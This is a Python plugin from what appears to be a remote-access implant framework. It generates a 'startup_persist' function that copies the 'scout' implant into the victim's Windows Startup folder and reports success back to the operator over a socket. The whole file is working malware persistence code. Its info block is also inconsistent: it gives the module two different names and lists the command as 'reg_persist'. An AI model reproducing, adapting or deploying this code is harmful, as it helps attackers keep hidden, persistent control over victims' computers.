# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from shutil import copy')
        self.config.import_statements.append('from os import path, getcwd')
        self.config.import_statements.append('from sys import argv')
        self.config.import_statements.append('from getpass import getuser')
        self.config.functions.append('''
def startup_persist(filepath):
    copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
    send_all(s,'[+]Persistence via startup folder achieved')''')
        self.config.logics.append('''
            elif command == "startup_persist":
                startup_persist(path.join(getcwd(),path.abspath(argv[0])))''')
        self.config.help_menu[
            'startup_persist'] = 'This module copies the scout to the windows startup folder'
    elif option == 'info':
        self.log.blank('\nName             : Registry Persistence component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : shutil, sys, os' \
                       '\nCommands         : reg_persist' \
                       '\nDescription      : This module copies the scout to the windows startup folder')
        return {
            "Name": "Startup Persistence component",
            "OS": "Windows",
            "Required Modules": "shutil, sys, os",
            "Commands": "reg_persist",
            "Description": "This module copies the scout to the windows startup folder"}